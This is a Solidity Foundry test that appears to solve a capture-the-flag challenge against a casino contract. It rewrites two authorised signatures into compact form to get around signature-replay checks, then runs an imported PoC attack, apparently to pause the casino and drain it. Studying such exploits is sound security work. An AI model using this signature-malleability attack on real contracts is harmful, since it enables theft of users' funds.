// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "src/Challenge.sol";
import "src/Casino.sol";
import "test/PoC.sol";

contract Solve is Test {

    Challenge challenge;

    function test_solve() public {
        address player = vm.addr(0xfa192b22f09a76c4c4f0de85af1550c0531fd9ea4224c280cbac88cdacca139f);
        challenge = Challenge(0x94A0bF771642069cb0a4f8003C4Cf15073dCe790);
        Casino casino = challenge.CASINO();
        vm.startPrank(player);

        bytes32 pauseSalt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        bytes memory pauseSig = hex"27de8de4a32ab07247ec662a8c2143f0298ec762230473f7b017d9bc24304cb16f6ed3f44f3affa5d1b71e21de4dba9df4fe2fc23cdfbdb286928cb47fe7f7d41c";
        bytes32 resetSalt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
        address system = 0x2f88e1bF1a42b97eED5437Be8516dAa20B1be876;
        bytes memory resetSig = hex"b037fe6e3f02246b84a5d9623030b031319705f484e3187de2855cc11243ebfc1fe8a101a5c4baf5b979c1113d49c1ca9f83fbeecd6e7b7c1b3e13bf563826c11b";

        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(pauseSig, 0x20))
            s := mload(add(pauseSig, 0x40))
            v := byte(0, mload(add(pauseSig, 0x60)))
        }
        bytes memory newPauseSig = abi.encodePacked(r, bytes32(uint256(v - 27) << 255) | s);
        assembly {
            r := mload(add(resetSig, 0x20))
            s := mload(add(resetSig, 0x40))
            v := byte(0, mload(add(resetSig, 0x60)))
        }
        bytes memory newResetSig = abi.encodePacked(r, bytes32(uint256(v - 27) << 255) | s);

        PoC poc = new PoC(address(casino), payable(player));
        poc.attack{value: 1 ether}(PoC.PauseData(newPauseSig, pauseSalt), PoC.ResetData(newResetSig, payable(system), 1 ether, resetSalt));
    }
}